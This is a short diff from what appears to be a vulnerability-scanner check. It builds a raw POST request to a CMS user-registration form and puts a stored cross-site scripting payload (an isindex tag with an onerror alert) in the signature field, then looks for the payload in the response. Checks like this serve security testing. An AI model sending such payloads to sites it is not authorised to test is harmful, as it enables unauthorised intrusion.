@@ -49,9 +49,7 @@ X-forwarded-For: www.baidu.com
 Content-Type: application/x-www-form-urlencoded 
 Content-Length: 5605
 
-CS_Name=aaaaaa&CS_Email=a%40qq.com&CS_Nichen=aaaaaa&CS_Sex=0&CS_City=%C1%C9%C4%FE%CA%A1&CS_QQ=111111111&CS_Qianm=<isindex type=image src=1 onerror=alert(/'xss'/)>
-
-            """.format(url=url)
+CS_Name=aaaaaa&CS_Email=a%40qq.com&CS_Nichen=aaaaaa&CS_Sex=0&CS_City=%C1%C9%C4%FE%CA%A1&CS_QQ=111111111&CS_Qianm=<isindex type=image src=1 onerror=alert(/'xss'/)>""".format(url=url)
             code, head, res, errcode, _ = hh.http(url, raw=raw)
 
             if "/'xss'/" in res and '确定' in res:
